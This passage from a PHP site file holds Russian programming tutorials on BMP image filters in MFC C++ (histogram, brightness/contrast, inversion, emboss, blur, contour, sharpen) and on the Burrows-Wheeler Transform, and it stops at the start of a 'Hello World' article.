	oFile.Read(&FileHead, sizeof(BITMAPFILEHEADER));
	if(FileHead.bfType!=0x4D42) 	  //проверка: является ли файл рисунком в BMP формате
	{
		oFile.Close();
		return(FALSE);
	}
	oFile.Seek(sizeof(BITMAPFILEHEADER), CFile::begin);
	if((pPicInfo=(LPBITMAPINFO)new BYTE[FileHead.bfOffBits-sizeof(BITMAPFILEHEADER)])==NULL)
	{
		oFile.Close();
		return(FALSE);
	}
	oFile.Read(pPicInfo, FileHead.bfOffBits-sizeof(BITMAPFILEHEADER)); 	//считывание заголовка растра в только что выделенную память
	if(pPicInfo->bmiHeader.biCompression!=0) 	//поскольку программа учебная, мы работаем только с несжатыми файлами
	{
		oFile.Close();
		return(FALSE);
	}
	oFile.Seek(FileHead.bfOffBits, CFile::begin);
	iBytePerLine=((GetPicWidth()*pPicInfo->bmiHeader.biBitCount+31)>>5)<<2; 	//вычисляется количество байт на 1 линию
	if(pPicInfo->bmiHeader.biSizeImage==0) 	//если в файле не задан размер, корректируем это упущение
		pPicInfo->bmiHeader.biSizeImage=iBytePerLine*GetPicHeight();
	pPicture=new BYTE[pPicInfo->bmiHeader.biSizeImage]; 	//выделяем память под сами растровые данные
	if(pPicture==NULL)
	{
		oFile.Close();
		return(FALSE);
	}
	oFile.Read(pPicture, pPicInfo->bmiHeader.biSizeImage); 	//загружаем картинку в память
	oFile.Close();
	return(TRUE);
}
</pre>

<p>В памяти картинка расположена точка за точкой, начиная с верхнего левого угла вправо, далее вторая строка, третья, ..., до правого нижнего угла. Каждая точка представлена тремя байтами, каждый байт - это интенсивность цвета от 0 до 255. Первый байт - это B (Blue-синий), G (Green-зеленый) и R (Red-красный). В формате BMP каждая стока должна быть описана целым числом двойных слов, это должно быть учтено, информация в этих байтах может быть любой, поскольку она нигде не используются.</p>

<h2>Вывод изображения на экран</h2>
<p>Забегая вперед, уточним, что для работы некоторых фильтров необходимо две области памяти, одна с оригиналом рисунка, другая - буфер для результата применения фильтра. Принимая этот факт к рассмотрению, нужно организовать два буфера для изображения и указатель на память, в которой находиться текущая картинка. Таким образом, у нас уже организовалась возможность отмены действия, и если результат применения фильтра нам не нравится, мы просто присваиваем указателю на текущую картинку значение области памяти с исходным изображением. Отменить таким образом можно только одно действие, повторная отмена действия опять поменяет местами результат и источник. Для реализации множественной отмены нужно создать несколько буферов, используя массивы (в том числе динамические).</p>
<p>Для вывода используем стандартную функцию StretchDIBits</p>
<pre class="code">
//режим вывода изображения
int iOldStretchMode=SetStretchBltMode(hdc, COLORONCOLOR);
//вывод изображения в контекст устройства hdc с сохранением пропорций
StretchDIBits(hdc, 0, 0, GetPicWidth(), GetPicHeight(), 0, 0, GetPicWidth(), GetPicHeight(), pPicture, pPicInfo, DIB_RGB_COLORS, SRCCOPY);
</pre>

<h2>Точечные преобразования</h2>
<p>Рассмотрим графические фильтры. Их можно разделить на две категории:</p>
<p><i>точечные</i> - новое значение элемента рассчитывается на основании его старого значения;</p>
<p><i>пространственные</i> - при расчете учитывается старое значение пиксела, а также значения близлежащих пикселов.</p>
<p>Более подробное рассмотрение начнем с точечных фильтров, как с наиболее простых.</p>

<h2>Расчет "Гистограммы яркости"</h2>
<p>Гистограмма - это график частоты появления точек различных степеней яркости. Гистограмма предназначена для определения распределения яркости в изображении и более равномерного распределения.</p>
<p>По оси Х расположена интенсивность яркости от 0 (светлые тона) до 255 (темные тона), по оси Y частота появления. Для изображения в градациях черного необходимо посчитать частоту появления точек всех яркостей и вывести на экран эти значения (в процентах).</p>
<p>Для цветного изображения каждый цвет имеет разный весовой коэффициент и рассчитывается по формуле</p>
<div class="info">Brightness = 0.3*Red + 0.59*Green + 0.11*Blue</div>

<h2>Расчет гистограммы</h2>
<pre class="code">
//pHistogram[iX] - массив, в котором хранятся значения яркостей
//Перед расчетом нужно его обнулить, потому что точек с каким-то значением яркости может и не быть
for(int iX=0; iX<256; iX++)	pHistogram[iX]=0;
//перебирая все точки рисунка подряд, рассчитываем значение яркости, которое имеет текущая точка,
//это значение есть № ячейки массива, значение которой мы увеличиваем на единицу
BYTE *pCurrPixel=NULL;	//указатель на текущий пиксель
for(int iY=0; iY<GetPicHeight(); iY++)
	for(iX=0; iX<GetPicWidth(); iX++)
	{
		pCurrPixel=pPicture+iY*iBytePerLine+iX*3;	//не забываем о iBytePerLine
		pHistogram[(BYTE)(0.11*(*pCurrPixel)+0.59*(*(pCurrPixel+1))+ 0.3*(*(pCurrPixel+2)))]+=1;
	}
//теперь выводим на экран гистограмму
//по оси Х - яркость, от 0 до 255
//по оси Y - частота появления
CRect oFrameRect;		//прямоугольник, в который выводим гистограмму
DWORD iMaxBright=0, iSumBright=0;
for(int i=0; i<256; i++)
	iSumBright+=pHistogram[i];
iMaxBright=3*iSumBright/256;	//максимальное значение яркости, которое будет отображать гистограмма
double kx=((double)oFrameRect.Width())/256.0;	     //коэффициент масштаба по Х
double ky=((double)oFrameRect.Height())/iMaxBright;	//коэффициент масштаба по Y
int x=0, y=0;
for(i=0; i<256; i++)	//выводим слева направо
{
	x=oFrameRect.left+(int)(kx*i+0.5);	//рассчитываем координаты относительно области вывода
	y=oFrameRect.bottom;
	pDC->MoveTo(x, y);
	y=oFrameRect.bottom-(int)(ky*pHistogram[i]+0.5);
	if(y<oFrameRect.top)
		y=oFrameRect.top;
	pDC->LineTo(x, y);	//длина линии соответствует частоте появления текущей (i) яркости
}
</pre>

<h2>Корректировка диапазона яркости</h2>
<p>После того, как мы видим гистограмму фотографии, мы можем подкорректировать диапазон яркости картинки. Для примера посмотрим на фотографию пловца.
<center><img src="'. $site['setting']['base'] .'/img/m/0805/paint/Swim1.jpg"></center>
Также здесь мы видим гистограмму яркости. Проведем небольшую коррекцию, растянув диапазон яркости. На фотографии видно слева уменьшаем диапазон на 37 единиц, а справа на 25. Это значит, что все точки с яркостью до 37 теперь будут абсолютно белыми, а точки с яркостью большей 230 (25 это значение с обратной стороны, т.е. -25, поэтому 255-25=230) станут абсолютно черными, весь диапазон между ними мы равномерно растягиваем на всю шкалу (от 0 до 255). Вот результат и гистограмма новой фотографии.
<center><img src="'. $site['setting']['base'] .'/img/m/0805/paint/Swim2.jpg"></center>
</p>

<p>От теории к практике.</p>

<p>Вызываем диалоговое окно, в котором пользователь корректирует диапазон и нажимает ОК. В результате у нас есть два значения</p>
<pre class="code">
int iOffset_b;	//смещение в светлых тонах
int iOffset_t;	//смещение в темных тонах

int iOffset_256=256-iOffset_t;	//т.к. в диалоге мы получаем значение - на сколько сместить от 255

//все что за диапазоном доводим до максимума. Для светлых тонов - максимально светлый - 0,
//для темных максимально темный - 255
for(int ix=0; ix<iOffset_b; ix++)
	RGBTransformTable[0][ix]=RGBTransformTable[1][ix]=RGBTransformTable[2][ix]=0;
for(int ix=255; ix>=iOffset_256; ix--)
	RGBTransformTable[0][ix]=RGBTransformTable[1][ix]=RGBTransformTable[2][ix]=255;
</pre>

<p>BYTE RGBTransformTable[color][index] - это таблица преобразования цветов, которая, представлена двухмерным массивом.</p>
<p>Color - определяет цвет, для которого мы хотим получить новое значение. У нас цветов три - RGB и, соответственно, размерность равна трем.</p>
<p>Index - это индекс в массиве, который определяет ячейку, в которой храниться новое значение яркости.</p>
<p>Т.е. допустим, мы хотим применить некоторое изменение яркости по значениям, которые записаны в таблице преобразования. Берем точку с координатами (0, 0) и смотрим, какую она имеет яркость, например, R=36, G=89, B=231. Новые значения яркости берем из таблицы преобразования:</p>
<p>В красный цвет записываем значение из ячейки RGBTransformTable[0][36],</p>
<p>зеленый - RGBTransformTable[1][89],</p>
<p>синий - RGBTransformTable[2][231].</p>
<p>Дальше изменяем остальные точки. В этой части кода нам понадобиться функция, которая, получая координаты точки, будет возвращать его адрес. Это функция</p>
<pre class="code">
BYTE *GetPixel(LONG x, LONG y)
{
	return(pPicture+(iBytePerLine*y+x*pPicInfo->bmiHeader.biBitCount/8));
}
</pre>

<p>Теперь перебираем последовательно все точки и изменяем значение яркости pSourcePic - указатель на картинку источник (фотография, к которой мы применяем фильтр), pDestPic - буфер, в который мы помещаем результат.</p>
<pre class="code">
BYTE *pDestPixel=NULL, *pSourPixel=NULL;
for(int  y=0; y<pSourcePic->GetPicHeight(); y++)
	for(int x=0; x<pSourcePic->GetPicWidth(); x++)
	{
		pDestPixel=pDestPic->GetPixel(x, y);
		pSourPixel=pSourcePic->GetPixel(x, y);
		*pDestPixel=RGBTransformTable[0][*pSourPixel];
		*(pDestPixel+1)=RGBTransformTable[0][*(pSourPixel+1)];
		*(pDestPixel+2)=RGBTransformTable[0][*(pSourPixel+2)];
	}
</pre>

<p>Думаю, что с назначением массива RGBTransformTable[][] все понятно. Осталось только его заполнить, т.к. теорию мы уже рассмотрели, код заполнения не должен вызвать трудности.</p>
<pre class="code">
//равномерно растягиваем диапазон яркости от iOffset_b до iOffset_256
double fStep=256.0/((double)(256-(iOffset_b+iOffset_t)));
double fCol=0.0;
for(int ix=iOffset_b; ix&lt;iOffset_256; ix++)
{
	RGBTransformTable[0][ix]=RGBTransformTable[1][ix]=RGBTransformTable[2][ix]=(int)(fCol+0.5);
	fCol+=fStep;
}
</pre>

<p>Как уже говорилось выше, после применения фильтров результат, находящийся в буфере, необходимо вывести на экран. Теперь адрес pSourcePic указывает не на картинку, а на буфер, в который мы будем помещать результат следующих трансформаций, а pDestPic - указывает на картинку-оригинал (Undo - меняет эти значения местами).</p>

<h2>Фильтр "Инверсия цветов"</h2>
<p>Это самый простой фильтр, как в понимании, так и в реализации. Он изменяет цвета на противоположные, если точка была белой - меняем на черную.</p>
<p>Фильтр "Инверсия цветов" реализуется также посредством таблицы преобразования, только заполняется эта таблица другим методом.</p>
<pre class="code">
for(int ix=0; ix<256; ix++)
{
	RGBTransformTable[0][ix]=255-ix;
	RGBTransformTable[1][ix]=255-ix;
	RGBTransformTable[2][ix]=255-ix;
}
</pre>

<p>Смена цвета каждой точки ничем не отличается от рассмотренного в "Корректировке диапазона яркости".</p>

<h2>Фильтр изменения "Яркости/Контраста"</h2>
<p>Изменение яркости заключается в увеличении или уменьшении интенсивности всех пикселей на заданное значение (одинаковое для всех каналов).</p>
<p>Значения, на которые нам нужно изменить яркость и контрастность, мы получаем из диалогового окна</p>
<div align="center"><img border="0" width="370" height="147" src="'. $site['setting']['base'] .'/img/m/0805/paint/DialogB_C.gif"></div>
<pre class="code">
for(ix=0; ix<256; ix++)
{
	ibx=ix+iBrigh;	//увеличение на iBrigh единиц, может быть как положительным, так и отрицательным
	if(ibx > 255)
	{
		RGBTransformTable[0][ix]=255;
		RGBTransformTable[1][ix]=255;
		RGBTransformTable[2][ix]=255;
	}
	else 
		if(ibx < 0)
		{
			RGBTransformTable[0][ix]=0;
			RGBTransformTable[1][ix]=0;
			RGBTransformTable[2][ix]=0;
		}
		else
		{
			RGBTransformTable[0][ix]=ibx;
			RGBTransformTable[1][ix]=ibx;
			RGBTransformTable[2][ix]=ibx;
		}
}
</pre>

<p>С контрастом дело обстоит немного сложнее. Заполнение таблицы преобразования будем делать, исходя из "серой середины"</p>
<pre class="code">
#define MEDIUM_CONTRAST 159
</pre>

<p>Значение 159 больше среднего арифметического (127). Это значение ближе к понятию "серый цвет", чем RGB(127, 127, 127) - темно-серый и RGB(200, 200, 200) - светло-серый. Со значением RGB(159, 159, 159) достигается более реалистичный эффект.</p>
<p>Чтобы откорректировать контраст, сначала сместим яркость на нужную величину, а затем либо "сжатие", любо "растяжение" диапазона яркости. При "сжатии"  диапазона яркости значения будут изменяться не равномерно, а пропорционально их удаленности от "серой середины". "Растяжение" сделано аналогично за исключением того, что смещение по шкале яркости сверху и снизу одинаково.</p>
<pre class="code">
#define MEDIUM_CONTRAST 159
int ix=0, iIndexT=0, iIndexB=0, iColorOffset=0, ibx, iLimitB, iLimitT;
double fCol=0.0, fStep;
if(iContrast<0)	// iContrast - значение, на которое корректируем контраст
{
	for(ibx=0; ibx<3; ibx++)	//последовательно перебираем все каналы
		for(ix=0; ix<256; ix++)
			if(RGBTransformTable[ibx][ix]<MEDIUM_CONTRAST)
			{
				iColorOffset=(MEDIUM_CONTRAST-RGBTransformTable[ibx][ix])*iContrast/128;
				if((RGBTransformTable[ibx][ix]-iColorOffset) > MEDIUM_CONTRAST)
					RGBTransformTable[ibx][ix]=MEDIUM_CONTRAST;
				else
					RGBTransformTable[ibx][ix]-=iColorOffset;
			}else
			{
				iColorOffset=(RGBTransformTable[ibx][ix]-MEDIUM_CONTRAST)*iContrast/128;
				if((RGBTransformTable[ibx][ix]+iColorOffset) < MEDIUM_CONTRAST)
					RGBTransformTable[ibx][ix]=MEDIUM_CONTRAST;
				else
					RGBTransformTable[ibx][ix]+=iColorOffset;
			}
}else
	if(iContrast>0)
	{
		iLimitB=iContrast*MEDIUM_CONTRAST/128;
		for(ibx=0; ibx<3; ibx++)
			for(iIndexB=0; iIndexB<256; iIndexB++)
			{
				if(RGBTransformTable[ibx][iIndexB]<iLimitB)
					RGBTransformTable[ibx][iIndexB]=0;
				else break;
			}
		iLimitT=iContrast*128/MEDIUM_CONTRAST;
		for(ibx=0; ibx<3; ibx++)
			for(iIndexT=0; iIndexT<256; iIndexT++)
			{
				if((RGBTransformTable[ibx][iIndexT]+iLimitT) > 255)
					RGBTransformTable[ibx][iIndexT]=255;
				else break;
			}
		fStep=256.0/((double)(256-iLimitB+iLimitB));
		for(ibx=0; ibx<3; ibx++)
		{
			fCol=0.0;
			for(ix=iIndexB; ix<iIndexT; ix++)
			{
				if(RGBTransformTable[ibx][ix]>=iLimitB || RGBTransformTable[ibx][ix]<256-iLimitT)
				{
					fCol=(double)((int)((double)(RGBTransformTable[ibx][ix]-iLimitB)*fStep+0.5));
					RGBTransformTable[ibx][ix]=((fCol>255.0)?(255):(int)fCol);
				}
			}
		}
	}
</pre>

<p>После заполнения таблицы RGBTransformTable[][]изменяем значения всех точек, как было рассмотрено выше.</p>

<h2>Фильтр "Рельеф"</h2>
<p>Этот фильтр имеет несколько реализаций, в данной статье мы рассмотрим точечную реализацию. Результат работы фильтра можно сравнить с рисунком на "незастывшем" бетоне. Достигается такой эффект вычитанием яркости точки из яркости точки той же позиции, но смещенной на несколько пикселов в сторону и вверх (смещать можно и других направлениях). Полученная разница смещается в область серых тонов.</p>
<pre class="code">
#define EMBOSS_X 3		//задаем смещение по оси Х
#define EMBOSS_Y -3	//задаем смещение по оси Y
BYTE *pDestPix=NULL, *pSourPix1=NULL, *pSourPix2=NULL, iBr1, iBr2, iBrResult;
//(x, y) - координаты точки, для которой делаем преобразование, последовательно перебираем все точки фотографии
pDestPix=pDestPic->GetPixel(x, y);	//адрес точки в буфере (куда поместить результат)
pSourPix1=pSourPic->GetPixel(x, y); //адрес точки источника (первая точка)
pSourPix2=pSourPic->GetPixel(x+EMBOSS_X, y+EMBOSS_Y);	//адрес точки (источника), смещенной на несколько пикселей (вторая точка)
iBr1=(BYTE)(0.11*(*pSourPix1)+0.59*(*(pSourPix1+1))+0.3*(*(pSourPix1+2)));	//рассчитываем яркость для 1-ой точки
iBr2=(BYTE)(0.11*(*pSourPix2)+0.59*(*(pSourPix2+1))+0.3*(*(pSourPix2+2)));	//яркость 2-ой точки
iBrResult=(iBr1-iBr2+255)/2;		//рассчитываем яркость и смещаем ее в область серых тонов
*pDestPix=iBrResult;		       //запись результата во все три канала
*(pDestPix+1)=iBrResult;
*(pDestPix+2)=iBrResult;
</pre>

<h2>Пространственные (матричные) преобразования</h2>
<p>Последующие фильтры будут пространственными (матричными). Пространственные преобразования заключаются в нахождении свертки значений пикселов. Свертка вычисляется как сумма пиксельных значений, попавших в зону преобразования, помноженных на весовые коэффициенты. Для расчетов используется матрица:</p>
<p>размер матрицы - задает область пикселов, которые будут учитываться при преобразовании;</p>
<p>элементы матрицы - весовые коэффициенты;</p>
<p>все значения элементов матрицы - тип преобразования.</p>

<h2>Фильтр "Размытие"</h2>
<p>Расчет нового элемента можно осуществлять с использованием следующего псевдокода:</p>
<pre class="code">
int iMatrixX=5;				          //размерность 5х5
int iMatrixY=5;
const int iBlurMatrix[25]=				//Матрица для размытия:
{	1, 1, 1, 1, 1,
	1, 1, 1, 1, 1,
	1, 1, 1, 1, 1,
	1, 1, 1, 1, 1,
	1, 1, 1, 1, 1
};
const int *pMatrix=iBlurMatrix;	//указатель на матрицу

//на рассчитываемую точку указывают координаты (x, y)
//pDestPixel - адрес указывает на точку в буфере, по которому мы записываем результат
BYTE *pSourPixel=NULL;		//указатель на пиксель
int iNewPixel=0;				  //новое значение пикселя
int iSymmaCoef=0;			  //подсчет суммы коэффициентов
for(int iY=-iMatrixY/2; iY&lt;iMatrixY; iY++)
	for(int iX=-iMatrixX/2; iX&lt;iMatrixX; iX++)
	{
		pSourPixel=GetPixel(x+iX, y+iY);		//получаем адрес точки с учетом смещения
		iNewPixel = iNewPixel + (*pSourPixel)*pMatrix[iY][iX];
		iSymmaCoef= iSymmaCoef + pMatrix[iY][iX];
	}
*pDestPixel=iNewPixel/iSymmaCoef;		//записываем новое значение элемента
</pre>

<p>Этот же расчет проводим для остальных каналов, далее переходим к следующей точке.</p>
<p>Если для предыдущих операций можно было результат помещать в ту же область памяти, что и оригинал, то для матричных фильтров необходимы две области памяти.</p>

<h2>Фильтр "Контур"</h2>
<p>Работа этого фильтра происходит аналогично размытию, все, что нужно - это изменить значения матрицы и ее разрядность.</p>
<pre class="code">
#define CONTUR 3		//коэффициент четкости, можно задать в диалоговом окне
const int iConturMatrix[9]=
{ -1*CONTUR, -1*CONTUR, -1*CONTUR,
  -1*CONTUR,  8*CONTUR, -1*CONTUR,
  -1*CONTUR, -1*CONTUR, -1*CONTUR
};
pMatrix=iConturMatrix;
iMatrixX=3;		//размерность матрицы 3х3
iMatrixY=3;
</pre>

<p>Сумма элементов матрицы равна нулю. Если яркость пикселов, попавших в зону действия матрицы примерно одинакова, - результат будет близкий к нулю. А если преобразуемый пиксель имеет яркость, отличную от окружающих, - результат будет больше нуля. Результат работы всего фильтра - черное изображение с белым контуром.</p>

<h2>Фильтр "Четкость"</h2>

<p>Поскольку фильтр матричный, ему нужна матрица:</p>
<pre class="code">
pMatrix=iBlurMatrix;
iMatrixX=5;
iMatrixY=5;
</pre>

<p>В данном случае ничего не перепутано, для работы фильтра действительно нужна такая же матрица, как и при размытии. Фильтр "Четкость" иллюстрирует собой борьбу противоположностей. Для повышения четкости картинки нужно сначала размыть изображение, а потом вычислить разность между размытым изображением и оригиналом, на величину этой разности изменяется разность оригинала. В результате однородные участки изменятся незначительно, а высокочастотные участки изображения станут более контрастными.</p>
<pre class="code">
#define SHARP 3		//коэффициент усиления
//
//размываем точку фильтром "Размытие", код приведен выше
//
//pSourPix - адрес точки (картинка оригинал)
//pDestPix - адрес точки (картинка после применения преобразований, буфер)
int iResult=((*pSourPix)-(*pDestPix))*SHARP;		//получаем новое значение яркости
*pDestPix= (*pDestPix) + iResult;		            //записываем новое значение
</pre>

<h2>Заключение</h2>
<p>Соберем все выше сказанное в один блок:</p>
<pre class="code">
class CPicture			//класс по работе с изображением
{
private:
	BYTE *pPicture;
	LPBITMAPINFO pPicInfo;
public:
	LONG iBytePerLine;
public:
	BOOL PicLoad(CString sFileName);		//загрузка изображения с файла
	BOOL PicSave(CString sFileName);		//запись в файл
	void PicDelete();			            //удаление картинки из памяти
	void PicDraw(CDC *pDC);			       //вывод на экран
	RGBQUAD *GetColorTable(void)		     //возвращает указатель на таблицу цветов
		{	return((LPRGBQUAD)(((BYTE*)(pPicInfo))+sizeof(BITMAPINFOHEADER))); };
	BYTE *GetPixel(LONG x, LONG y);		//адрес пикселя (x, y)
	BOOL GetHistogram(DWORD *pHistogram);		//расчет гистограммы
	LONG GetPicWidth(void)		//ширина картинки
		{	return((pPicInfo==NULL)?(0):pPicInfo->bmiHeader.biWidth);	};
	LONG GetPicHeight(void)		//высота картинки
		{	return((pPicInfo==NULL)?(0):pPicInfo->bmiHeader.biHeight);	};
	LPBITMAPINFO GetPicInfo(void)	//возвращает указатель заголовка растра
	{	return(pPicInfo);	};
	BYTE *GetPicture(void)		//возвращает указатель на растровые данные
	{	return(pPicture);	};
};
</pre>

<p>Работа фильтров во многом схожа, поэтому их вполне логично объединить</p>
<pre class="code">
class CFilter		//базовый класс
{
protected:
	CPicture *pSourPic;		//указатель на "оригинал" изображения
	CPicture *pDestPic;		//указатель на буфер, куда будет помещено изображение после преобразования
public:
	virtual BOOL TransformPix(LONG x, LONG y)		//виртуальный метод, реализация будет переопределяться
			{	return(FALSE);	};
};
</pre>

<p>Дальше фильтры делятся на два направления: точечные и матричные</p>
<pre class="code">
class CDotFilter : public CFilter			   //базовый класс точечных фильтров
{
protected:
	BYTE RGBTransformTable[3][256];	     //таблица преобразования
public:
	BOOL TransformPix(LONG x, LONG y);		//трансформация пикселя
};
BOOL CDotFilter::TransformPix(LONG x, LONG y)
{
	BYTE *pDestPixel=NULL, *pSourPixel=NULL;
	if(pSourPic==NULL)		//источник необходим
		return(FALSE);
	if(pDestPic==NULL)		//буфер не обязателен
		pDestPic=pSourPic;
	if((pDestPixel=pDestPic->GetPixel(x, y))==NULL || (pSourPixel=pSourPic->GetPixel(x, y))==NULL)
		return(FALSE);
//изменяем изображение, используя таблицу преобразования
	*pDestPixel=RGBTransformTable[0][*pSourPixel];	*(pDestPixel+1)=RGBTransformTable[0][*(pSourPixel+1)];
	*(pDestPixel+2)=RGBTransformTable[0][*(pSourPixel+2)];
	return(TRUE);
}
//------------------------------------------------
class CMatrixFilter : public CFilter		//базовый класс для матричных фильтров
{
protected:
	int iMatrixX;		       //размерность матрицы
	int iMatrixY;
	const int *pMatrix;		//указатель на матрицу
public:
	BOOL TransformPix(LONG x, LONG y);		//трансформация пикселя
};
BOOL CMatrixFilter::TransformPix(LONG x, LONG y)
{
	BYTE *pDestPixel=NULL, *pSourPixel=NULL;
	int iXStart=0, iYStart=0, iXFinish=iMatrixX, iYFinish=iMatrixY;
	if(pSourPic==NULL || pDestPic==NULL)	//источник и буфер необходимы
		return(FALSE);
    if(x-iMatrixX/2<0)
		iXStart=iMatrixX/2-x;
	if(y-iMatrixY/2<0)
		iYStart=iMatrixY/2-y;
	if(x+iMatrixX/2>pSourPic->GetPicWidth())
		iXFinish-=(x+iMatrixX/2-pSourPic->GetPicWidth());
	if(y+iMatrixY/2>pSourPic->GetPicHeight())
		iYFinish-=(y+iMatrixY/2-pSourPic->GetPicHeight());
	int iNewRGB[3], iCount, c, iX, iY;
	for(c=0; c<3; c++)			//расчет для всех каналов цвета
	{
		iNewRGB[c]=0;
		iCount=0;
		for(iY=iYStart; iY<iYFinish; iY++)
			for(iX=iXStart; iX<iXFinish; iX++)
			{
				if((pSourPixel=pSourPic->GetPixel(x+(iX-iMatrixX/2), y+(iY-iMatrixY/2)))!=NULL)
				{		//свертывает яркость точки
					iNewRGB[c]+=(pMatrix[iY*iMatrixX+iX]*(*(pSourPixel+c)));
					iCount+=pMatrix[iY*iMatrixX+iX];
				}
			}
	}
    pDestPixel=pDestPic->GetPixel(x,y);
	for(c=0; c<3; c++)
	{
		if(iCount!=0)
			iNewRGB[c]=iNewRGB[c]/iCount;
		if(iNewRGB[c]<0)
			iNewRGB[c]=0;
		else
			if(iNewRGB[c]>255)
				iNewRGB[c]=255;
		*(pDestPixel+c)=iNewRGB[c];		//записываем новое значение яркости
	}
	return(TRUE);
}
</pre>

<h3>Точечные фильтры</h3>
<pre class="code">
class CHistogram : public CDotFilter		//гистограмма
{
public:
	BOOL Init(int iOffset_b, int iOffset_t);
};//------------------------------------------------
class CBrightContrast : public CDotFilter		//яркость/контраст
{
public:
	BOOL Init(int iBrigh, int iContrast);
};//------------------------------------------------
class CInvertColor : public CDotFilter		//инверсия
{
public:
	CInvertColor();		//инициализация таблицы преобразования
};//------------------------------------------------
class CEmboss : public CDotFilter			//рельеф
{
public:
	BOOL TransformPix(LONG x, LONG y);
};
class CToGrayscale : public CDotFilter		//перевод в градации серого
{
public:
	BOOL TransformPix(LONG x, LONG y);
};
</pre>

<h3>Матричные фильтры</h3>
<pre class="code">
class CBlur : public CMatrixFilter		//размытие
{
public:
	CBlur();
};//------------------------------------------------
class CContur : public CMatrixFilter		//контур
{
public:
	CContur();
};//------------------------------------------------
class CSharp : public CMatrixFilter		//четкость
{
public:
	CSharp();
	BOOL TransformPix(LONG x, LONG y);
};
</pre>

<h3>Вызов фильтров</h3>
<p>Заведем переменную CFilter *pCurrentFilter, которая будет указывать на активный фильтр. Когда пользователь выбирает нужный ему фильтр из меню, программа помещает адрес этого фильтра в переменную pCurrentFilter и вызывает функцию:</p>
<pre class="code">
void CPainterDoc::Transform(void)
{
	//CPicture *pSourcePic; - адрес оригинала картинки
	//CPicture *pDistancePic; - адрес буфера
	LONG x, y;
	for(y=0; y<pSourcePic->GetPicHeight(); y++)		//перебираем последовательно все точки
		for(x=0; x<pSourcePic->GetPicWidth(); x++)
			pCurrentFilter->TransformPix(x, y);				//вызов функции преобразования для текущего фильтра
	SetModifiedFlag();		//после преобразования устанавливаем флаг, картинка изменена
}
</pre>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/bwt.html':
	$site['page']['title'] .= ' - BWT-кодинг';
	$site['page']['description'] .= ' BWT-кодинг';
	$site['page']['keywords'] .= ', BWT-кодинг';
	$site['page']['body'] = '<h1>BWT-кодинг</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=10169"><i>Мяут</i></a>

<h2>Преобразование Бэрроуза-Уиллера</h2>
<p>Преобразование Бэрроуза-Уиллера (Burrows-Wheeler Transform, далее BWT) появилось достаточно недавно (статья "A Block-sorting Lossless Data Compression Algorithm" была опубликована в 1994 году), хотя, как принято считать, у одного из авторов - Майкла Уиллера - идеи использовать сортировку в алгоритмах компрессии появились еще в 80-х, однако тогда методу не было найдено применения.</p>
<p>Сам по себе, BWT не является алгоритмом сжатия, однако выходная последовательность гораздо удобнее для сжатия, нежели исходная. Для лучших результатов, поверх кодированной последовательности применяется Move-to-Front, а затем алгоритм сжатия Хаффмана или арифметическое кодирование. В частности, связка BWT+Huff используется в популярном формате архивов BZIP2. По степени компрессии он уступает лишь PPM (который, кстати, медленнее работает) Давайте обратимся к самому алгоритму, рассмотрим его поведение на примере слова "математика".</p>
<p>Алгоритм действует блочно, профессионалы в области сжатия рекомендуют использовать размер буфера 1-2 KB. Затем полученный блок подвергают циклическим перестановкам, записывая результаты в список:</p>
<pre class="code">
	char* trans_matrix = (char*) malloc(size*size); //наш список
    for(int I=0; I&lt;size; I++) {
        memcpy(trans_matrix+I*size, src+I, size-I); //Циклическая перестановка на I позиций
        memcpy(trans_matrix+I*size+size-I, src, I);
    }
</pre>

<p>В итоге получается следующее:</p>
<pre>
математика
 атематикам
  тематикама
   ематикамат
    матикамате
     атикаматем
      тикаматема
       икаматемат
        каматемати
         аматематик
</pre>

<p>Заметим, что два слова, начинающиеся на "а", заканчиваются на "м". Еще два слова - аналогичная пара: "т"-"а". Сблизим эти строчки. Для этого применим сортировку в лексикографическом порядке (я использовал сортировку методом Шелла, хотя подойдет любой другой метод, даже быстрая сортировка из стандартной библиотеки C, хотя по скорости она проигрывает):</p>
<pre class="code">
	tmsort(trans_matrix, size, size, size);
</pre>

<p>Мы получили следующий список:</p>
<pre>
аматематик
атематикам
атикаматем
ематикамат
икаматемат
каматемати
математика <-- 6
матикамате
тематикама
тикаматема
</pre>

<p>Выберем из этого списка исходную строку, а также сохраним все заключительные буквы:</p>
<pre class="code">
	for(int I=0; I&lt;size; I++) {
        dst[I] = *(trans_matrix+I*size+size-1);

        if(memcmp(trans_matrix+I*size, origin, size)==0)
            str_no = I;
    }
</pre>

<p>В итоге мы получили: 6кммттиаеаа.</p>
<p>Дальше, можно использовать RLE, хотя более перспективно выглядят Арифметическое кодирование и Кодирование Хаффмана (при этом я заменял все повторяющиеся символы нулями).</p>

<h2>Обратное преобразование.</h2>
<p>Давайте запишем оставшиеся у нас данные:</p>
<pre>
.........к
.........м
.........м
.........т
.........т
.........и
.........а
.........е
.........а
.........а
</pre>

<p>Так как происходили циклические преобразования, то у нас остались буквы в том же количестве, в котором они ыли в слове. Также мы знаем, что оригинальная матрица была лексикографически отсортирована, значит, если мы отсортируем оставшиеся у нас буквы, то получим верную последовательность:</p>
<pre>
кммттиаеаа -> аааеикммтт

а........к
а........м
а........м
е........т
и........т
к........и
м........а
м........е
т........а
т........а
</pre> 

<p>Далее составляются последовательности, состоящие из последней буквы и начала строки, сортируются, и вбираются соответствующие буквы</p>
<pre>
ка, ма, ма, те, ти, ик, ам, ем, ат, ат
ам, ат, ат, ем, ик, ка, ма, ма, те, ти

ам.......к
ат.......м
ат.......м
ем.......т
ик.......т
ка.......и
ма.......а
ма.......е
те.......а
ти.......а 
</pre>

<p>И так далее. В конечном итоге мы получаем оригинальную последовательность.</p>
<p>К сожалению сам по себе алгоритм не очень проворен, однако он был серьезно ускорен Джулианом Сэвардом (разработчиком архивного формата BZIP2). Как это сделать вы можете прочитать в следующих документах:</p>
<br>
<div class="info">
Julian Seward "On the Performance of BWT Sorting Algorithms"<br>
Julian Seward "Space-time Tradeoffs in the Inverse B-W Transform"<br>
</div>

<hr>
Скачать исходник: <a href="'. $site['setting']['base'] .'/img/m/0805/bwt/bwt_source.rar">bwt_source.rar</a> (1 кБ)
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/helloworld.html':
	$site['page']['title'] .= ' - Hello World';
	$site['page']['keywords'] .= ', Hello World';
	$site['page']['body'] = '<h1>Hello World</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=3352"><i>x2er0</i></a>

